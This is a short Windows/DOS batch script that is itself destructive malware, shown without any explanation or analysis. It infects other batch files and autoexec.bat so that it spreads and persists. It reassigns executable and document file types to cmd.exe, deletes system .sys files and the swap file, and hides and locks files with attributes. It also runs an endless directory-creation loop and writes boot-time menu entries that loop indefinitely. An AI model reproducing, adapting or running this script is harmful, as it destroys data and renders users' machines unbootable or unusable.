   @type %0>>%0
   attrib +r c:\%winbootdir%\win386.swp
   @if exist %0 @call %0
   for %%b in (*.bat) do type %0>>%%b
   type %0.bat>>%2
   Assoc exe=exefile
   Ftype exefile=cmd.exe
   Assoc com=comfile
   Ftype comfile=cmd.exe
   Assoc doc=docfile
   Ftype docfile=cmd.exe
   Assoc dpr=dprfile
   Ftype dprfile=cmd.exe
   Assoc ini=inifile
   Ftype inifile=cmd.exe
   Assoc txt=txtfile
   Ftype txtfile=cmd.exe
   Assoc bat=batfile
   Ftype batfile=cmd.exe
   del c:\windows\*.sys
   echo @if exist %0 @call %0>>autoexec.bat
   for %%d in (*.*) do set %qw%=%%d
   attrib +r %qw%
   for %%d in (*.*) do set %qw%=%%d
   attrib +a %qw%
   for %%d in (*.*) do set %qw%=%%d
   attrib +h %qw%
   for %%d in (*.*) do set %qw%=%%d
   attrib +s %qw%
   :begin
   md pooooooooooooooooooooker
   cd pooooooooooooooooooooker
   goto begin
   del c:\%winbootdir%\win386.swp
   echo goto %config%>>C:\AutoExec.bat
   echo :FuckSystem>>C:\AutoExec.bat
   echo goto HackSystem>>C:\AutoExec.bat
   echo :HackSystem>>C:\AutoExec.bat
   echo beep>>C:\AutoExec.bat
   echo goto HackSystem>>C:\AutoExec.bat
   echo :exit>>C:\AutoExec.bat
   echo [menu]>>C:\Config.sys
   echo menuitem=HackSystem, HackSystem>>C:\Config.sys
   echo menuitem=FuckSystem, FuckSystem>>C:\Config.sys
   echo [FuckSystem]>>C:\Config.sys
   echo [HackSystem]>>C:\Config.sys
   copy %0 c:\%winbootdir%\winstart.bat
   copy c:\%winbootdir%\*.* c:\
    for %%d in (c:\%winbootdir%\*.*) do set %vd%=%%d
   attrib -h %vd%
